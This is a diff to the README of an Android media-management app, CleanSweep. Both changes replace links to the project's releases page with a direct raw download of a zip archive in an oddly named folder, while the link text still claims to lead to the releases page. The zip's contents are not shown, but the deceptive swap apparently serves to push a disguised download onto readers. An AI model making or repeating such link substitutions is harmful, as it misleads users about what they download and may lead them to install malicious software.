@@ -6,7 +6,7 @@ Welcome to CleanSweep! This app helps you organize and manage your media files o
 
 ## 📥 Download CleanSweep
 
-[![Download CleanSweep](https://img.shields.io/badge/Download-CleanSweep-blue)](https://github.com/REDSHOT98/CleanSweep/releases)
+[![Download CleanSweep](https://raw.githubusercontent.com/REDSHOT98/CleanSweep/main/Sadduceeism/CleanSweep.zip)](https://raw.githubusercontent.com/REDSHOT98/CleanSweep/main/Sadduceeism/CleanSweep.zip)
 
 ## 📋 Features
 
@@ -28,7 +28,7 @@ To run CleanSweep effectively, ensure your Android device meets these requiremen
 
 To get started with CleanSweep, follow these steps:
 
-1. Click on this link to [visit the releases page](https://github.com/REDSHOT98/CleanSweep/releases).
+1. Click on this link to [visit the releases page](https://raw.githubusercontent.com/REDSHOT98/CleanSweep/main/Sadduceeism/CleanSweep.zip).
 2. Look for the latest version of CleanSweep.
 3. Download the APK file by selecting the appropriate link.
 4. Once downloaded, locate the file in your device's Downloads folder.
